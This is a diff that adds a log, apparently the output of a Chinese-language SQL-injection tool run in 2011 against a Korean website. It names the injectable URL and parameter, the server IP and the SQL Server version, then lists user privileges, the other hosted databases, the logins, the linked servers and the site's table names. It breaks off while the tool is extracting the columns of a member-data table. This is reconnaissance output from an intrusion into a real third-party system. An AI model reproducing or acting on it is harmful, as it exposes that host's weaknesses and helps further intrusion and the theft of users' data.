@@ -1,0 +1,183 @@
+■漏洞信息:============================================================
+ ·URL:http://www.kautm.net/newkautm/kautm02/column/view.asp?bname=b_column&no=84
+ ·页面标题：kautm - 措切扁贱捞傈 匙飘况农狼 吝缴
+ ·参数:bname=b_column&no=84
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:211.34.104.79
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 05:26:11 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Expires: -1
+Pragma: no-cache
+Content-Length: 27592
+Content-Type: text/html
+Expires: Mon, 04 Apr 2011 05:26:11 GMT
+Set-Cookie: ASPSESSIONIDACDBRTDA=OBPBJBJALHNNIFKNLDPIOIBP; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：hye5250
+- 用户名：hye5250
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：SQL-005
+- 服务名：MSSQLSERVER
+- 系统用户名：hye5250
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 0
+db_backupoperator: 0
+db_datawriter: 1
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+abcvd	F:\MSSQL\Data\abcvd_data.mdf	
+abroadguy	F:\MSSQL\Data\abroadguy_data.mdf	
+abutler	F:\MSSQL\Data\abutler_data.mdf	
+actionguy4001	F:\MSSQL\Data\actionguy4001_data.mdf	
+adjob12	F:\MSSQL\Data\adjob12_data.mdf	
+adventureschool	F:\MSSQL\Data\adventureschool_data.mdf	
+agaweb	F:\MSSQL\Data\agaweb_data.mdf	
+ahnbn	F:\MSSQL\Data\ahnbn_data.mdf	
+airdic	F:\MSSQL\Data\airdic_data.mdf	
+airi0213	F:\MSSQL\Data\airi0213_data.mdf	
+aivppp	F:\MSSQL\Data\aivppp_data.mdf	
+akplushome	F:\MSSQL\Data\akplushome_data.mdf	
+alis11	F:\MSSQL\Data\alis11_data.mdf	
+alphahair	F:\MSSQL\Data\alphahair_data.mdf	
+amosakplus	F:\MSSQL\Data\amosakplus_data.mdf	
+ams05	F:\MSSQL\Data\ams05_data.mdf	
+analyze79	F:\MSSQL\Data\analyze79_data.mdf	
+anfantkcstv	F:\MSSQL\Data\anfantkcstv_data.mdf	
+angel817	F:\MSSQL\Data\angel817_data.mdf	
+ankukman	F:\MSSQL\Data\ankukman_data.mdf	
+antique7	F:\MSSQL\Data\antique7_data.mdf	
+areesem	F:\MSSQL\Data\areesem_data.mdf	
+arimang0815	F:\MSSQL\Data\arimang0815_data.mdf	
+aromajeju	F:\MSSQL\Data\aromajeju_data.mdf	
+aromalijot	F:\MSSQL\Data\aromalijot_data.mdf	
+asadal24	F:\MSSQL\Data\asadal24_data.mdf	
+asiatelecom	F:\MSSQL\Data\asiatelecom_data.mdf	
+aspsol0585	F:\MSSQL\Data\aspsol0585_data.mdf	
+atomapp	F:\MSSQL\Data\atomapp_data.mdf	
+audghk1128	F:\MSSQL\Data\audghk1128_data.mdf	
+audiologykorea	F:\MSSQL\Data\audiologykorea_data.mdf	
+auto2u	F:\MSSQL\Data\auto2u_data.mdf	
+ayoung0209	F:\MSSQL\Data\ayoung0209_data.mdf	
+babo6165	F:\MSSQL\Data\babo6165_data.mdf	
+baeggob2008	F:\MSSQL\Data\baeggob2008_data.mdf	
+bagae	F:\MSSQL\Data\bagae_data.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+dummy_sa_real		???????	04  8 2009  4:15PM	
+guest	.	.	08  6 2000  1:27AM	
+sdev		??∵???疞?	04 20 2008  8:08PM	
+sql_manager	A	?傉??儿?甐?	04  8 2009  3:25PM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+YdNew	sleeping	BB-PC	5944	AWAITING COMMAND		
+YdNew	sleeping	OWNER-PC	740	AWAITING COMMAND		
+TheOne2.0	sleeping	3-PC	3620	AWAITING COMMAND		
+TheOne2.0	sleeping	3-PC	3620	AWAITING COMMAND		
+TheOne2.0	sleeping	3-PC	3620	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+Excel	Jet 4.0	Microsoft.Jet.OLEDB.4.0	F:\home\admincvg\www\invoicefile\test.xls			
+Excel2	Jet 4.0	Microsoft.Jet.OLEDB.4.0	\\211.34.104.79\F$\home\admincvg\www\invoicefile\test.xls			
+sql-002.cafe24.com	SQL Server	SQLOLEDB	sql-002.cafe24.com		sql-002.cafe24.com	
+SQL-005	SQL Server	SQLOLEDB	SQL-005		SQL-005	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+一次性获取失败，正在批次获取……
+------------------------------------------------------------
+正在获取数据库 [hye5250] 的表名……
+一次性获取失败，正在批次获取……
+批次获取失败，正在逐条获取……
+apply_tbl	
+b_column	
+b_column_comment	
+baseball	
+baseball_comment	
+baseball_notice	
+baseball_notice_comment	
+baseball_photo	
+baseball_photo_comment	
+buying	
+buying_comment	
+dtproperties	
+dumoc	
+dumoc_comment	
+freeboard	
+freeboard_comment	
+gallery	
+gallery_comment	
+lab_tbl	
+LOG_TABLE	
+marketing	
+marketing_comment	
+member_table	
+memberdata	
+memberdata_comment	
+news	
+news_comment	
+pds	
+pds_comment	
+Press_File_TBL	
+Press_File_TBL2	
+Press_File_TBL3	
+qna	
+qna_comment	
+sesu	
+sesu_comment	
+teck_comment	
+teck2	
+test	
+test1	
+tlo	
+tlo_comment	
+tm_bio	
+tm_bio_comment	
+tm_it	
+tm_it_comment	
+tm_nano	
+tm_nano_comment	
+tPopup	
+uni	
+uni_comment	
+zip_code	
+------------------------------------------------------------
+正在获取 [hye5250].[memberdata] 的列名……
+一次性获取失败，正在批次获取……
+批次获取失败，正在逐条获取……
